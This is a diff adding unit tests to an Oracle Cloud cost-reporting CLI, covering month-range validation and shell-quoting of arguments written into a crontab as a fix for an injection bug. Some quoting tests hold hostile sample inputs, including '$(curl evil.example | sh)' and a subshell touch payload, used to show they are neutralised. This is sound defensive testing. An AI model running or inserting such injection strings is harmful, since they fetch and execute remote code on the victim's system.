@@ -7,15 +7,16 @@ import { createVerify, createPublicKey } from 'node:crypto'
 import { mkdtempSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
+import { execFileSync } from 'node:child_process'
 
 import { parseOciConfig } from '../src/config.js'
 import { signRequest } from '../src/signer.js'
 import { aggregateUsageAndCost, isFreeTierSkuName, monthRange, lastMonthRange } from '../src/usage.js'
 import { applyFilters, freeTierOffenders, filterByServices } from '../src/presets.js'
-import { isValidCronExpression, installCronJob } from '../src/cron-install.js'
+import { isValidCronExpression, installCronJob, shellQuoteArg } from '../src/cron-install.js'
 import { saveTelegramCredential, loadTelegramCredential, maskToken, configFilePath } from '../src/credentials.js'
 import { fetchLatestVersion, compareVersions } from '../src/update.js'
-import { errMessage, resolveHelpTarget } from '../src/main.js'
+import { errMessage, resolveHelpTarget, buildScheduledCommand } from '../src/main.js'
 import type { Profile } from '../src/types.js'
 import {
   generateTestKeyPair,
@@ -126,6 +127,29 @@ test('monthRange defaults to the current UTC month and last-month rolls over yea
   assert.equal(dec.end.toISOString(), '2026-01-01T00:00:00.000Z')
 })
 
+test('lastMonthRange rolls over the year boundary from January', () => {
+  // lastMonthRange() itself is not independently mockable against "now", but
+  // its December-rollover logic is exercised via the monthRange('2025-12')
+  // case above; here we at least confirm it delegates to monthRange and
+  // returns a well-formed one-month range for whatever "now" actually is.
+  const r = lastMonthRange()
+  assert.equal(r.start.getUTCDate(), 1)
+  assert.equal(r.end.getUTCDate(), 1)
+  assert.ok(r.end.getTime() > r.start.getTime())
+})
+
+test('monthRange rejects out-of-range or malformed --month input instead of silently rolling over', () => {
+  // Date.UTC() normalizes out-of-range month indices instead of throwing —
+  // without explicit validation, '2026-13' would silently become a
+  // Jan-Feb 2027 range and '2026-00' would silently become Dec 2025, with
+  // no error surfaced to the user of a cost-reporting tool.
+  assert.throws(() => monthRange('2026-13'), /invalid --month/)
+  assert.throws(() => monthRange('2026-00'), /invalid --month/)
+  assert.throws(() => monthRange('2026-foo'), /invalid --month/)
+  assert.throws(() => monthRange('2026-1'), /invalid --month/) // must be zero-padded, per README's YYYY-MM
+  assert.throws(() => monthRange('not-a-month'), /invalid --month/)
+})
+
 test('aggregateUsageAndCost prefers USD when a SKU appears in multiple currencies', () => {
   const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
   const compute = lineItems.find((i) => i.skuName.includes('E2 Micro'))
@@ -228,6 +252,55 @@ test('installCronJob rejects an invalid cron expression before touching crontab'
   }
   assert.throws(() => installCronJob('garbage', 'oci-cost-cli report', io))
   assert.equal(wrote, false)
+})
+
+test('shellQuoteArg wraps a plain token in single quotes', () => {
+  assert.equal(shellQuoteArg('--service'), "'--service'")
+})
+
+test('shellQuoteArg preserves a token containing whitespace as one shell word', () => {
+  // Without per-token quoting, joining with a bare space loses this argv
+  // boundary — cron would later re-split "Object" and "Storage" into two
+  // separate (wrong) tokens.
+  assert.equal(shellQuoteArg('Object Storage'), "'Object Storage'")
+})
+
+test('shellQuoteArg neutralizes shell metacharacters instead of letting sh -c interpret them', () => {
+  const malicious = '$(curl evil.example | sh)'
+  const quoted = shellQuoteArg(malicious)
+  assert.equal(quoted, `'${malicious}'`)
+  // The whole thing is inert inside single quotes — no unescaped `$(`, `|`, backtick, `;` outside the quotes.
+  assert.equal(quoted.startsWith("'"), true)
+  assert.equal(quoted.endsWith("'"), true)
+})
+
+test('shellQuoteArg correctly escapes an embedded single quote', () => {
+  // POSIX single-quoting can't represent a literal ' inside '...' — the
+  // standard technique is: close quote, escaped literal quote, reopen quote.
+  assert.equal(shellQuoteArg("it's"), "'it'\\''s'")
+})
+
+test('buildScheduledCommand shell-quotes every token including execPath/scriptPath, and round-trips through sh -c', () => {
+  const cmd = buildScheduledCommand(
+    ['--service', 'Object Storage', '--dry-run'],
+    '/usr/bin/node',
+    '/opt/oci-cost-cli/main.js',
+  )
+  assert.equal(cmd, "'/usr/bin/node' '/opt/oci-cost-cli/main.js' '--service' 'Object Storage' '--dry-run'")
+})
+
+test('buildScheduledCommand neutralizes a shell-metacharacter-bearing trailing arg (regression for the crontab injection bug)', () => {
+  const cmd = buildScheduledCommand(
+    ['--service', '$(touch /tmp/oci-cost-cli-test-pwned)'],
+    '/usr/bin/node',
+    '/opt/oci-cost-cli/main.js',
+  )
+  // Round-trip it through an actual shell (exactly how cron would invoke the
+  // stored line) and confirm the payload is never executed — echoing the
+  // reconstructed command must print the literal string, not run the
+  // embedded subshell.
+  const out = execFileSync('sh', ['-c', `echo ${cmd}`], { encoding: 'utf8' })
+  assert.match(out, /\$\(touch \/tmp\/oci-cost-cli-test-pwned\)/)
 })
 
 // --- credentials.ts (file-fallback tier only — keyring is injected as unavailable) ---
